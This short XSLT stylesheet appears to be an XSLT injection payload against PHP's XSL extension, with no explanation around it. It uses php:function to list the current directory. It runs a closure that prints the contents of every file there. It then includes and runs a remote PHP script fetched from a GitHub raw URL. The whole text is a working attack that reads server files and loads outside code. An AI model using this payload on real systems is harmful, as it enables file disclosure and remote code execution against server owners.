<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
<xsl:template match="/">

    <xsl:value-of name="assert" select="php:function('scandir', '.')"/>
    
    <xsl:value-of select="php:function('call_user_func', function(){ 
                          $path    = './';
$files = scandir($path);
$files = array_diff(scandir($path), array('.', '..'));
foreach($files as $file){
  echo  $file ;
                          echo '</br>';
  if(is_file($file)){
  $homepage = file_get_contents($file);
echo  $homepage ;
  }
}
    })"/>
    
    <xsl:value-of select="php:function('include','https://raw.githubusercontent.com/tmieulet/secu/main/listFiles_lang.php')"/>
    
</xsl:template>
</xsl:stylesheet>
